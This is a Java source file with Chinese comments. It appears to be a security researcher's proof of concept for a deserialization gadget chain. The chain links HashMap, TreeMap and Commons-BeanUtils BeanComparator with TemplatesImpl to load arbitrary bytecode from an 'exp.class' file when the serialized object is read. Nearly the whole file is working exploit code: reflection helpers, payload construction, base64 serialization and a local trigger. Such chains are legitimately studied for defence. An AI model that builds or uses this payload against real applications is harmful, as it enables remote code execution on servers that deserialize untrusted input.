import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.PriorityQueue;
import java.io.*;
import java.util.*;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.bag.AbstractMapBag;
import org.apache.commons.collections.bag.TreeBag;
import org.apache.commons.collections.bidimap.AbstractDualBidiMap;
import org.apache.commons.collections.bidimap.DualTreeBidiMap;
import org.postgresql.ds.PGConnectionPoolDataSource;
import sun.reflect.ReflectionFactory;

import javax.xml.transform.Templates;

/*
  HashMap + TreeMap利用链
  HashMap调用到AbstractMap.equals 能调用map.get   (TreeMap的get存在compare方法)

  at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171)
	at java.util.TreeMap.getEntryUsingComparator(TreeMap.java:376)
	at java.util.TreeMap.getEntry(TreeMap.java:345)
	at java.util.TreeMap.get(TreeMap.java:278)
	at java.util.AbstractMap.equals(AbstractMap.java:472)
	at java.util.HashMap.putVal(HashMap.java:634)
	at java.util.HashMap.readObject(HashMap.java:1397)
*/
public class cb {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
//        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class"));

        TemplatesImpl obj = new TemplatesImpl();

        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "zeropeach");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());


        BeanComparator comparator = new BeanComparator(null);

        setFieldValue(comparator, "property", "outputProperties");


        TreeMap treeMap1 = makeTree(obj, comparator);
        TreeMap treeMap2 = makeTree(obj, comparator);
        HashMap hashMap = makeMap(treeMap1, treeMap2);




        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
      
        oos.writeObject(hashMap);

        oos.close();
//        String a = Base64.getEncoder().encodeToString(barr.toByteArray());
//        System.out.println(a);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(barr.toByteArray());

        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();


    }

    public static String base64serial(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }
    public static void base64deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
    public static void deserTester(Object o) throws Exception {
        base64deserial(base64serial(o));
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        if(field != null) {
            field.set(obj, value);
        }
    }
  
    //可以当作TreeMap.put(o,1)来看
    public static TreeMap<Object, Object> makeTree(Object o, Comparator comparator) throws Exception {
        TreeMap<Object, Object> map = new TreeMap<>();
        setFieldValue(map, "size", 1);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object node = nodeCons.newInstance(o, 1, null);
        setFieldValue(map, "root", node);
        setFieldValue(map, "comparator", comparator);

        return map;
    }

    //相当于HashMap.put(v1,"b"),HashMap.put(v2,"c")
    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, "b", null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, "c", null));
        setFieldValue(s, "table", tbl);
        return s;
    }

}




    
